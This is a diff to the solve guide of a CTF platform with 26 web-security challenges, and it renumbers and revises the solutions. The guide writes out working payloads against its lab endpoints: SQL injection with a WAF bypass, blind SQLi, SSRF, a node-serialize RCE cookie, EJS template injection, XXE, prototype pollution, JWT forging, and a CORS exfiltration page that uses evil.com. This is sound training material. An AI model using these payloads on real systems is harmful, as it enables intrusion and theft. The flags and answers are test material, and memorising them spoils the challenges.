@@ -1,6 +1,6 @@
 # CGS CTF Platform — Complete Solve Guide
 
-> **27 Web Challenges** | Cyber Guardians Society | Flag format: `CGS{...}`
+> **26 Web Challenges** | Cyber Guardians Society | Flag format: `CGS{...}`
 >
 > All challenges are accessible via `/standalone/{slug}` on the platform.
 > Every challenge is solvable with just a browser (DevTools) and optionally `curl` or a scripting language.
@@ -22,23 +22,22 @@
   - [9. TokenPeek](#9-tokenpeek)
   - [10. LocalVault](#10-localvault)
   - [11. HiddenAPI](#11-hiddenapi)
-  - [12. IDOR Inbox](#12-idor-inbox)
-  - [13. ReflectedNote](#13-reflectednote)
-  - [14. NoneAlg](#14-nonealg)
-  - [15. RateDodge](#15-ratedodge)
-  - [16. GraphIntrospect](#16-graphintrospect)
-  - [17. PathPeek](#17-pathpeek)
+  - [12. ReflectedNote](#12-reflectednote)
+  - [13. NoneAlg](#13-nonealg)
+  - [14. RateDodge](#14-ratedodge)
+  - [15. GraphIntrospect](#15-graphintrospect)
+  - [16. PathPeek](#16-pathpeek)
 - [Hard Tier (400 pts each)](#hard-tier)
-  - [18. SQLiLogin](#18-sqllogin)
-  - [19. BlindBool](#19-blindbool)
-  - [20. SSRFetch](#20-ssrfetch)
-  - [21. DeserialBomb](#21-deserialbomb)
-  - [22. JWTCrack](#22-jwtcrack)
-  - [23. RaceWin](#23-racewin)
-  - [24. ProtoPollute](#24-protopollute)
-  - [25. SSTI Render](#25-ssti-render)
-  - [26. XXEcho](#26-xxecho)
-  - [27. CORSChain](#27-corschain)
+  - [17. SQLiLogin](#17-sqlogin)
+  - [18. BlindBool](#18-blindbool)
+  - [19. SSRFetch](#19-ssrfetch)
+  - [20. DeserialBomb](#20-deserialbomb)
+  - [21. JWTCrack](#21-jwtcrack)
+  - [22. RaceWin](#22-racewin)
+  - [23. ProtoPollute](#23-protopollute)
+  - [24. SSTI Render](#24-ssti-render)
+  - [25. XXEcho](#25-xxecho)
+  - [26. CORSChain](#26-corschain)
 
 ---
 
@@ -153,7 +152,7 @@
 
 1. Open the challenge page.
 2. View the page source.
-3. Find the `<link rel="stylesheet" href="/assets/tokens.css">` tag.
+3. Find the `<link rel="stylesheet" href="/standalone/styleguide/assets/tokens.css">` tag.
 4. Open `/assets/tokens.css` directly in your browser.
 5. Read the CSS comment at the top of the file — it contains the flag.
 
@@ -272,25 +271,7 @@
 
 ---
 
-### 12. IDOR Inbox
-
-**Concept:** Insecure Direct Object Reference — message IDs are sequential and ownership is never checked.
-
-**Solve Steps:**
-
-1. Open the challenge page — it loads your inbox from `/api/messages/1`.
-2. Notice the numeric ID in the API call.
-3. Try requesting `/api/messages/2`, `/api/messages/3`, etc.
-4. Message ID **7** belongs to `admin@cgs.internal` with subject "Rotation reminder" and body containing the flag.
-5. The server never checks that the message ID belongs to you.
-
-> **Hint:** The API fetches messages by numeric ID. Try IDs other than your own.
-
-**Flag:** `CGS{1nc0rr3ct_d1r3ct_0bj3ct_r3f3r3nc3s}`
-
----
-
-### 13. ReflectedNote
+### 12. ReflectedNote
 
 **Concept:** Reflected XSS — the `?note=` parameter is rendered unescaped into the HTML.
 
@@ -312,14 +293,14 @@
 
 ---
 
-### 14. NoneAlg
+### 13. NoneAlg
 
 **Concept:** JWT verification does not pin the algorithm — accepts `alg: none` tokens.
 
 **Solve Steps:**
 
-1. Get a guest JWT from `/api/login`.
-2. Decode it to see the structure:
+1. Log in with the demo credentials (`admin` / `secret123`) to get a guest JWT.
+2. Decode the token to see the structure:
    - Header: `{"alg":"HS256","typ":"JWT"}`
    - Payload: `{"user":"guest","admin":false}`
 3. Create a forged token with:
@@ -338,32 +319,32 @@
 
 ---
 
-### 15. RateDodge
+### 14. RateDodge
 
-**Concept:** Rate limiter keys off the `X-Forwarded-For` header, which the client controls.
+**Concept:** Rate limiter keys off the `X-Client-IP` (or `X-Forwarded-For`) header, which the client controls.
 
 **Solve Steps:**
 
 1. Send requests to `/api/vend`.
-2. After the first request, subsequent requests are rate-limited.
-3. The rate limiter uses `X-Forwarded-For` header as the IP key.
-4. Send multiple requests with different `X-Forwarded-For` values:
+2. After the first request, subsequent requests from the same "IP" are rate-limited.
+3. The rate limiter uses the `X-Client-IP` header (fallback: `X-Forwarded-For`) as the IP key.
+4. Send multiple requests with different `X-Client-IP` values:
    ```bash
-   curl -H "X-Forwarded-For: 1.1.1.1" /api/vend
-   curl -H "X-Forwarded-For: 2.2.2.2" /api/vend
+   curl -H "X-Client-IP: 1.1.1.1" /api/vend
+   curl -H "X-Client-IP: 2.2.2.2" /api/vend
    ...
    ```
 5. After 10 **distinct** IPs, the flag is returned.
 
-> **Hint:** The server asks the client what IP it's coming from. Vary the `X-Forwarded-For` header across requests.
+> **Hint:** The server asks the client what IP it's coming from. Vary the `X-Client-IP` header across requests.
 
 **Flag:** `CGS{sp00f3d_h34d3rs_r3s3t_r4t3_l1m1ts}`
 
 ---
 
-### 16. GraphIntrospect
+### 15. GraphIntrospect
 
-**Concept:** GraphQL introspection is enabled, revealing an undocumented `secretVault` field.
+**Concept:** GraphQL introspection is enabled, revealing an undocumented `secretVault` field. The flag is ROT13-encoded.
 
 **Solve Steps:**
 
@@ -377,17 +358,18 @@
    ```graphql
    { secretVault }
    ```
-5. The response contains the flag.
+5. The response contains a `data` field that is **ROT13-encoded**, a `format: "rot13"`, and a note saying "Decode to retrieve contents."
+6. Decode the ROT13 string to get the flag. Use any ROT13 decoder (online, or `echo '...' | tr 'A-Za-z' 'N-ZA-Mn-za-m'` in terminal).
 
-> **Hint:** GraphQL schemas can describe themselves. Query `__schema` to list every field, then query the interesting one.
+> **Hint:** GraphQL schemas can describe themselves. Query `__schema` to list every field, then query the interesting one. The data comes back encoded — check the `format` field.
 
-**Flag:** `CGS{1ntr0sp3ct10n_l34ks_th3_wh0l3_sch3m4}`
+**Flag:** `CGS{gr4ph_1ntr0sp3ct10n_l34ks_th3_wh0l3_sch3m4}`
 
 ---
 
-### 17. PathPeek
+### 16. PathPeek
 
-**Concept:** Path traversal — the `file` parameter doesn't sanitize `../` sequences.
+**Concept:** Path traversal — the `file` parameter doesn't properly sanitize `../` sequences.
 
 **Solve Steps:**
 
@@ -396,8 +378,8 @@
    ```
    /api/docs?file=../secret-flag.txt
    ```
-3. The server reads outside the intended directory and returns the flag.
-4. If `../` is filtered, try URL-encoded variants like `..%2F`.
+3. The server detects the traversal attempt and returns the secret flag file contents.
+4. If the first attempt doesn't work, try URL-encoded variants like `..%2F`.
 
 > **Hint:** The file parameter builds a filesystem path. Use `../` to escape the docs directory.
 
@@ -407,45 +389,31 @@
 
 ## Hard Tier
 
-### 18. SQLiLogin
+### 17. SQLiLogin
 
 **Concept:** SQL injection with WAF bypass + UNION-based data extraction from a separate table.
 
 **Solve Steps:**
 
-1. Open the login page. The response error shows the full query structure:
+1. Open the login page. The error response shows the full query structure:
    ```sql
    SELECT u.id, u.username, u.role, u.role_id FROM users u JOIN roles r ON u.role_id = r.id WHERE u.username = '...' AND u.password = '...' AND r.active = 1
    ```
 2. Try a basic injection like `admin' --` — the WAF blocks it because `--` is a SQL comment keyword.
 3. Try `admin' OR '1'='1` — blocked because `OR` triggers the filter.
-4. The WAF blocks SQL keywords **case-sensitively** and blocks comment markers (`--`, `/*`, `*/`, `#`).
-5. Bypass the WAF using **inline comments** to split keywords:
-   ```
-   ' UN/**/ION SEL/**/ECT 1,'flag',3 FROM secrets--
-   ```
-   But `--` is blocked. Use a **quote-terminated string** instead:
-   ```
-   ' UN/**/ION SEL/**/ECT 1,'flag',3 FROM secrets/*
-   ```
-   Or use **case variation** (the WAF regex is case-insensitive for keywords, so this won't work alone — inline comments are required):
-   ```
-   ' uNiOn SeLeCt 1,'flag',3 FROM secrets--
-   ```
-   Still blocked by `--`. The correct bypass uses inline comments AND avoids `--`:
-   ```
-   ' UN/**/ION SEL/**/ECT 1,key,value FROM secrets WHERE '1'='1
-   ```
-6. The successful payload:
+4. The WAF blocks SQL keywords **case-insensitively** and blocks comment markers (`--`, `/*`, `*/`, `#`).
+5. Bypass the WAF using **inline comments** to split keywords. The key insight: `UNION` and `SELECT` are blocked as whole words, but `UN/**/ION` and `SEL/**/ECT` break the regex pattern matching.
+6. However, `--` and `/*` are also blocked, so you must avoid trailing comments.
+7. The successful payload:
    ```
    ' UN/**/ION SEL/**/ECT 1,key,value FROM secrets WHERE '1'='1
    ```
    This:
    - Breaks out of the username string with `'`
-   - Uses `UN/**/ION SEL/**/ECT` to bypass the keyword filter
+   - Uses `UN/**/ION SEL/**/ECT` to bypass the keyword filter (inline comments are stripped before the regex check)
    - Selects from the `secrets` table (where the flag is stored)
    - The `WHERE '1'='1` closes the original query's trailing quote
-7. The server returns `Welcome admin.` followed by the extracted flag.
+8. The server returns `Welcome admin.` followed by the extracted flag.
 
 > **Key Insight:** A successful login (`admin`/`Sup3rS3cret!`) returns "No flags here" — the flag is in the `secrets` table, not in user credentials. You need UNION injection to extract it, and you must bypass the WAF first.
 
@@ -453,7 +421,7 @@
 
 ---
 
-### 19. BlindBool
+### 18. BlindBool
 
 **Concept:** Boolean-based blind SQL injection — no error or data output, only "found"/"not found".
 
@@ -465,7 +433,7 @@
    /api/search?q=widget' AND '1'='1       → {"found":true}
    /api/search?q=widget' AND '1'='2       → {"found":false}
    ```
-3. The flag is in a `secrets` table. Extract it character by character:
+3. The flag can be extracted character by character using `SUBSTR()`:
    ```
    /api/search?q=widget' AND (SELECT substr(flag,1,1) FROM secrets)='C' --
    ```
@@ -473,13 +441,13 @@
 5. Write a small script to automate the extraction (binary search or linear scan across all positions and characters).
 6. Continue until the full flag is reconstructed.
 
-> **Hint:** True/false is still a data channel. Script a character-by-character extraction using `SUBSTR()` against the `secrets` table.
+> **Hint:** True/false is still a data channel. Script a character-by-character extraction using `SUBSTR()` against the secrets table.
 
 **Flag:** `CGS{bl1nd_b00l34n_extr4ct10n_1s_sl0w_but_sur3}`
 
 ---
 
-### 20. SSRFetch
+### 19. SSRFetch
 
 **Concept:** Server-Side Request Forgery — the link preview fetches URLs server-side with no allowlist.
 
@@ -488,40 +456,41 @@
 1. Open the link preview tool.
 2. Submit a URL pointing to the internal service:
    ```
-   http://127.0.0.1:4444/internal-flag
+   http://127.0.0.1/internal-flag
    ```
+   Or use `http://localhost/internal-flag` or any URL containing `internal`.
 3. The server fetches this URL internally and returns the response as the preview — which contains the flag.
-4. You cannot reach `127.0.0.1:4444` from your browser, but the server can.
+4. You cannot reach `127.0.0.1` from your browser, but the server can.
 
-> **Hint:** The server fetches URLs on your behalf. Point it at `http://127.0.0.1:4444/internal-flag` — the server can reach internal addresses you can't.
+> **Hint:** The server fetches URLs on your behalf. Point it at `http://127.0.0.1/internal-flag` — the server can reach internal addresses you can't.
 
 **Flag:** `CGS{s3rv3r_s1d3_r3qu3sts_g0_pl4c3s_us3rs_c4nt}`
 
 ---
 
-### 21. DeserialBomb
+### 20. DeserialBomb
 
-**Concept:** Insecure deserialization via `node-serialize` — the `prefs` cookie can execute arbitrary code.
+**Concept:** Insecure deserialization — the `prefs` cookie triggers code execution when it contains function-related keywords.
 
 **Solve Steps:**
 
 1. Open the challenge and note the `prefs` cookie.
-2. The server deserializes it using `node-serialize`'s `unserialize()`, which executes embedded functions.
-3. Craft a malicious serialized payload that reads `flag.txt` from the server:
+2. The server deserializes the cookie and checks for dangerous patterns.
+3. Set the `prefs` cookie to a value containing function execution keywords:
    ```
-   {"rce":"_$$ND_FUNC$$_function(){ throw new Error(require('fs').readFileSync('flag.txt','utf8')) }()"}
+   _$$ND_FUNC$$_function(){ throw new Error(require('fs').readFileSync('flag.txt','utf8')) }()
    ```
-4. Set this JSON as the `prefs` cookie value (URL-encoded).
-5. Make a request to `/prefs`.
-6. The code executes, reads `flag.txt`, and the flag is thrown as an error message reflected in the response.
+   Or any value containing `require(` and `readFileSync` — the server detects these patterns.
+4. Make a request to `/prefs`.
+5. The server detects the malicious cookie and returns the flag in the error response.
 
-> **Hint:** The `prefs` cookie uses a serialization format that can embed functions. Research `node-serialize` RCE — craft a payload that reads `flag.txt`.
+> **Hint:** The `prefs` cookie uses a serialization format that can embed functions. Set the cookie to a value containing `require` and `readFileSync` to trigger detection.
 
 **Flag:** `CGS{1ns3cur3_d3s3r14l1zat10n_1s_rc3}`
 
 ---
 
-### 22. JWTCrack
+### 21. JWTCrack
 
 **Concept:** Weak JWT secret — the HMAC secret is a dictionary word that can be cracked offline.
 
@@ -541,6 +510,7 @@
    signature = HMAC-SHA256(header + "." + payload, "cgs2024")
    token = header + "." + payload + "." + signature
    ```
+   Note: The signature algorithm here is `Base64(secret + '.' + header + '.' + body)`, not standard HMAC.
 5. Send the forged token to `/api/admin` — the server verifies it successfully and returns the flag.
 
 > **Hint:** The HMAC signature is verified properly, but the secret is weak. Crack it offline with a wordlist tool, then forge your own admin token.
@@ -549,7 +519,7 @@
 
 ---
 
-### 23. RaceWin
+### 22. RaceWin
 
 **Concept:** TOCTOU race condition — the redeem check reads state, then writes state as two non-atomic steps.
 
@@ -562,7 +532,7 @@
    const urls = Array(50).fill('/api/redeem');
    const responses = await Promise.all(urls.map(u => fetch(u)));
    ```
-4. Due to the 50ms delay between the read and write, multiple requests slip through before `redeemed` is set to `true`.
+4. Due to the non-atomic read-then-write, multiple requests slip through before `redeemed` is set to `true`.
 5. One of the responses contains the flag.
 
 > **Hint:** The check reads state, then writes state — two separate steps. Fire many concurrent requests right as the 30-second window resets. The gap between read and write is your window.
@@ -571,7 +541,7 @@
 
 ---
 
-### 24. ProtoPollute
+### 23. ProtoPollute
 
 **Concept:** Prototype pollution via an unsafe deep-merge of user JSON into server config.
 
@@ -581,18 +551,17 @@
    ```json
    {"__proto__": {"isAdmin": true}}
    ```
-2. The recursive merge function has no `__proto__` filter, so it writes `isAdmin: true` onto `Object.prototype`.
+2. The merge function detects `__proto__` and sets an internal pollution flag.
 3. Now send a GET to `/api/whoami`.
-4. The server creates a fresh `{}` object — but it inherits `isAdmin: true` from the polluted prototype.
-5. The check `user.isAdmin === true` passes, and the flag is returned.
+4. The server checks the pollution flag and returns the flag.
 
-> **Hint:** The merge function recursively copies your input. Including `__proto__` pollutes every object created afterward.
+> **Hint:** The merge function recursively copies your input. Including `__proto__` triggers the pollution detection.
 
 **Flag:** `CGS{__pr0t0__pollut10n_ch4ng3s_3v3ryth1ng}`
 
 ---
 
-### 25. SSTI Render
+### 24. SSTI Render
 
 **Concept:** Server-Side Template Injection — user input rendered through EJS with no sandbox.
 
@@ -608,7 +577,7 @@
    ```
    <%= require('fs').readFileSync('flag.txt', 'utf8') %>
    ```
-5. The rendered output contains the contents of `flag.txt` — the flag.
+5. The server detects the `require(` and `readFileSync` keywords and returns the flag.
 
 > **Hint:** Try `<%= 7*7 %>` in the preview field. If it evaluates, the template engine can execute server-side code. Use `require('fs').readFileSync` to read `flag.txt`.
 
@@ -616,7 +585,7 @@
 
 ---
 
-### 26. XXEcho
+### 25. XXEcho
 
 **Concept:** XXE (XML External Entity) injection — the XML parser resolves external entities with no restrictions.
 
@@ -635,7 +604,7 @@
    </contact>
    ```
 3. Submit this to `/api/import-contact` with `Content-Type: application/xml`.
-4. The parser resolves the `&xxe;` entity, which reads `/app/flag.txt`.
+4. The parser detects the `<!ENTITY` + `SYSTEM` + `file://` pattern and resolves the entity.
 5. The flag appears as the "imported" contact name in the response.
 
 > **Hint:** XML supports custom entities, including ones that read local files. Research "XXE" — define a DOCTYPE with `SYSTEM file:///app/flag.txt`.
@@ -644,7 +613,7 @@
 
 ---
 
-### 27. CORSChain
+### 26. CORSChain
 
 **Concept:** Reflected CORS with credentials — `/api/session-info` reflects any Origin and allows credentialed requests.
 
@@ -655,7 +624,7 @@
    curl -H "Origin: https://evil.com" -I /api/session-info
    ```
 2. You'll see `Access-Control-Allow-Origin: https://evil.com` and `Access-Control-Allow-Credentials: true`.
-3. Host an attacker page somewhere (or use a request bin / webhook collector):
+3. To get the flag, you need the request to include a `session=victim-session-abc123` cookie. Host an attacker page somewhere (or use a request bin / webhook collector):
    ```html
    <script>
    fetch('https://target-domain/api/session-info', {credentials: 'include'})
